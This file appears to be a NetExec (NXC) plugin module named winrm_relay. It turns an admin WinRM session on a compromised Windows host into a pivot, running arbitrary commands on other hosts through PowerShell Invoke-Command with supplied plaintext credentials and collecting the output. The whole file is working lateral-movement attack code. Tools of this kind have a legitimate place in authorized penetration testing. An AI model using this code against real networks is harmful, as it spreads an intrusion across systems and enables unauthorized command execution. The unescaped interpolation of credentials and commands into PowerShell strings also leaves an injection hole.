import winrm
import json
import os

class NXCModule:
    name = "winrm_relay"
    description = "Relay commands from one WinRM host to another (New-PsSession)"
    supported_protocols = ["winrm"]
    opsec_safe = False
    multiple_hosts = False

    def options(self, context, module_options):
        """
        Parse REMOTE option in formats:
          host:user:password:domain[:command]
        Multiple hosts separated by commas
        Also supports:
          COMMAND=<cmd1;cmd2>
          JSON=true/false
          SAVE_JSON=true/false
        """
        self.targets = []
        self.commands = []
        self.output_json = False
        self.save_json = False

        remote_raw = module_options.get("REMOTE", "")
        if not remote_raw:
            context.log.error("[winrm_relay] REMOTE option not provided")
            raise ValueError("Remote host not provided")

        for entry in remote_raw.split(","):
            entry = entry.strip()
            if not entry:
                continue

            if "=" in entry:
                k, v = entry.split("=", 1)
                k = k.strip().upper()
                v = v.strip()
                if k == "COMMAND":
                    self.commands = [c.strip() for c in v.split(";") if c.strip()]
                elif k == "JSON":
                    self.output_json = v.lower() in ("true", "1", "yes")
                elif k == "SAVE_JSON":
                    self.save_json = v.lower() in ("true", "1", "yes")
                else:
                    context.log.warning(f"[winrm_relay] Unknown option ignored: {k}={v}")
            else:
                # Split host:user:password:domain:command
                parts = entry.split(":", 4)  # allow 5 elements max
                host = parts[0]
                user = parts[1] if len(parts) > 1 else None
                password = parts[2] if len(parts) > 2 else None
                domain = parts[3] if len(parts) > 3 else None
                command = parts[4] if len(parts) > 4 else None

                self.targets.append({
                    "host": host,
                    "user": user,
                    "password": password,
                    "domain": domain,
                    "command": command
                })

        if not self.targets:
            context.log.error("[winrm_relay] No remote hosts found in REMOTE")
            raise ValueError("Remote host not provided")

        context.log.info(f"[winrm_relay] Targets: {self.targets}")
        context.log.info(f"[winrm_relay] Global Commands: {self.commands}")
        context.log.info(f"[winrm_relay] JSON: {self.output_json}, SAVE_JSON: {self.save_json}")

    def on_admin_login(self, context, connection):
        results = []

        try:
            # Pivot session to the first compromised host
            pivot_session = winrm.Session(connection.host, auth=(connection.username, connection.password))

            for tgt in self.targets:
                host = tgt["host"]
                user = tgt["user"] or connection.username
                password = tgt["password"] or connection.password
                domain = tgt["domain"]
                target_user = f"{domain}\\{user}" if domain else user

                # Determine which commands to run: per-target > global > default
                cmd_list = []
                if tgt["command"]:
                    cmd_list = [tgt["command"]]
                elif self.commands:
                    cmd_list = self.commands
                else:
                    cmd_list = ["whoami"]

                # Resolve IP to hostname on the pivot host if needed
                ps_resolve = f"""
                $hostOrIP = '{host}'
                $resolvedHost = $hostOrIP
                try {{
                    $entry = [System.Net.Dns]::GetHostEntry($hostOrIP)
                    $resolvedHost = $entry.HostName
                }} catch {{
                    Write-Host '[!] Could not resolve IP, using original value'
                }}
                $resolvedHost
                """
                resolved_r = pivot_session.run_ps(ps_resolve)
                resolved_host = resolved_r.std_out.decode(errors="ignore").strip() or host

                context.log.info(f"[winrm_relay] Relaying from {connection.host} -> {resolved_host} as {target_user}")

                for cmd in cmd_list:
                    ps_script = f"""
                    $secpasswd = ConvertTo-SecureString '{password}' -AsPlainText -Force
                    $cred = New-Object System.Management.Automation.PSCredential ('{target_user}', $secpasswd)
                    Invoke-Command -ComputerName {resolved_host} -Credential $cred -ScriptBlock {{ {cmd} }}
                    """
                    r = pivot_session.run_ps(ps_script)

                    output = r.std_out.decode(errors="ignore").strip()
                    err = r.std_err.decode(errors="ignore").strip()

                    if r.status_code == 0:
                        if output:
                            for line in output.splitlines():
                                context.log.highlight(f"{resolved_host}: {line}")
                        else:
                            context.log.success(f"{resolved_host}: (no output)")
                    else:
                        context.log.error(f"{resolved_host}: {err}")

                    results.append({
                        "host": resolved_host,
                        "user": target_user,
                        "command": cmd,
                        "output": output.splitlines() if output else [],
                        "error": err.splitlines() if err else []
                    })

        except Exception as e:
            context.log.error(f"[winrm_relay] Relay failed: {e}")

        # JSON output
        if self.output_json:
            print(json.dumps(results, indent=2))

        if self.save_json:
            filename = "winrm_relay_results.json"
            try:
                with open(filename, "w") as f:
                    json.dump(results, f, indent=2)
                context.log.success(f"[winrm_relay] JSON results saved to {os.path.abspath(filename)}")
            except Exception as e:
                context.log.error(f"[winrm_relay] Failed to save JSON -> {e}")
